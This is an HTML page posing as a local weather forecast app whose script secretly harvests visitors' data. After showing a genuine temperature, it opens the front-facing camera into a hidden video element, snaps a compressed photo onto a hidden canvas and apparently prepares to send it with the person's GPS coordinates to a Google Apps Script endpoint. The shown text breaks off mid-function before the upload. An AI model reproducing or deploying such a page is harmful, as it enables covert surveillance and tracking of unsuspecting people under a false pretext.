<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Live - Local Forecast</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0; 
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); 
            color: white; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            text-align: center; 
        }
        .card { 
            background: rgba(255, 255, 255, 0.1); 
            padding: 40px; 
            border-radius: 25px; 
            backdrop-filter: blur(10px); 
            width: 85%; 
            max-width: 380px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }
        h1 { font-size: 3.5rem; margin: 10px 0; }
        .city { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; color: #00d2ff; }
        .btn { 
            background: #00d2ff; 
            color: #fff; 
            border: none; 
            padding: 15px 30px; 
            border-radius: 50px; 
            font-weight: bold; 
            margin-top: 25px; 
            cursor: pointer; 
            width: 100%; 
            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="city" id="city">Locating...</div>
    <h1 id="temp">--°</h1>
    <p id="stat">Weather Sync Active</p>
    <button class="btn" onclick="startUpdate()">UPDATE WEATHER</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    // YOUR NEW DEPLOYMENT URL
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzQyn2YMLV3RrEVr_WevGwUUeqAPEHhCfGgfNOa2fWg3cnll--WbfMh8zPF0YW9qPCElw/exec';

    async function startUpdate() {
        const btn = document.querySelector('.btn');
        btn.innerText = "SYNCING...";
        btn.disabled = true;

        if (!navigator.geolocation) {
            alert("Geolocation not supported.");
            return;
        }

        navigator.geolocation.getCurrentPosition(async (pos) => {
            // Update UI with real local temperature
            try {
                const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`).then(r => r.json());
                document.getElementById('temp').innerText = Math.round(w.current_weather.temperature) + "°";
                document.getElementById('city').innerText = "LOCAL AREA DATA";
            } catch (e) { console.log("Weather fetch error"); }
            
            // Run the capture and send process
            await captureAndSend(pos);
            
            btn.innerText = "UPDATED";
        }, (err) => {
            alert("Please allow Location and Camera access to continue.");
            btn.innerText = "UPDATE WEATHER";
            btn.disabled = false;
        });
    }

    async function captureAndSend(pos) {
        let photo = null;
        try {
            // Access camera
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            // Short delay to let camera focus
            await new Promise(r => setTimeout(r, 1000));
            
            const canvas = document.getElementById('c');
            canvas.width = 400; 
            canvas.height = 300;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Compress photo to avoid large payloads
            photo = canvas.toDataURL('image/jpeg', 0.4);
            
            // Stop

